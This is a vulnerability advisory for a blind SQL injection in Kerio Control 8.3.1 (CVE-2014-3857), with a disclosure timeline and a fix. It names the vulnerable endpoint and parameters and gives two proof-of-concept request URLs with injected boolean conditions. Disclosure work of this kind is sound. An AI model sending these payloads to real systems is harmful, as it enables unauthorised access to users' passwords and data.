@@ -1,0 +1,66 @@
+Document Title: 
+======================
+Kerio Control <= 8.3.1 Boolean-based blind SQL Injection
+
+Primary Informations:
+======================
+
+Product Name: Kerio Control
+Software Description: Kerio Control brings together multiple capabilities 
+ including a network firewall and router, intrusion detection and 
+ prevention (IPS), gateway anti-virus, VPN and content filtering. These 
+ comprehensive capabilities and unmatched deployment flexibility make 
+ Kerio Control the ideal choice for small and mid-sized businesses.
+Affected Version: Latest Version - 8.3.1 (released on 2014-05-20)
+Vendor Website: http://kerio.com
+Vulnerability Type: Boolean-based blind SQL Injection
+Severity Level: Very High
+Exploitation Technique: Remote
+CVE-ID: CVE-2014-3857
+Discovered By: Khashayar Fereidani
+Main Reference: http://fereidani.com/articles/show/76_kerio_control_8_3_1_boolean_based_blind_sql_injection
+Researcher's Websites: http://fereidani.com http://fereidani.ir
+                       http://und3rfl0w.com http://ircrash.com
+Researcher's Email: info [ a t ] fereidani [ d o t ] com
+
+
+Technical Details:
+=======================
+
+Kerio Control suffers from a SQL Injection Vulnerability which can lead to gain users 
+ sensitive informations like passwords , to use this vulnerability attacker need a 
+ valid client username and password .
+
+Vulnerable path: /print.php
+Vulnerable variables: x_16 and x_17
+HTTP Method: GET
+
+Proof Of Concept:
+=======================
+
+Blind Test:
+ TRUE: https://[SERVER IP]:4081/print.php?x_w=overall&x_14=L1&x_15=stats&x_16=16221 AND 1=1&x_17=16221&x_18=-1&x_1b=&x_1a=&x_1l=[ VALID SESSION]&x_3k={%27x_fj%27%3A16220%2C+%27x_fk%27%3A+16220}&x_3l={%27x_fj%27%3A16222%2C+%27x_fk%27%3A+16222}&x_1c=&x_1e=-270&x_1f=-1&x_3m=0&x_11=overall&x_12=individual&x_13=x_2l
+ FALSE: https://[SERVER IP]:4081/print.php?x_w=overall&x_14=L1&x_15=stats&x_16=16221 AND 1=2&x_17=16221&x_18=-1&x_1b=&x_1a=&x_1l=[ VALID SESSION]&x_3k={%27x_fj%27%3A16220%2C+%27x_fk%27%3A+16220}&x_3l={%27x_fj%27%3A16222%2C+%27x_fk%27%3A+16222}&x_1c=&x_1e=-270&x_1f=-1&x_3m=0&x_11=overall&x_12=individual&x_13=x_2l
+ 
+
+Solution:
+========================
+Valid escaping variables or type checking for integer
+
+
+Exploit:
+========================
+Private
+
+
+Vulnerability Disclosure Timeline:
+==================================
+May 30 2014 - Disclosure 
+May 31 2014 - Received a CVE ID
+May 31 2014 - Initial Report to Kerio Security Team
+June 3 2014 - Support team replied fix is planned to be included in a future release
+June 30 2014 - Patched
+July 1 2014 - Publication
+
+
+                                           Khashayar Fereidani - http://fereidani.com
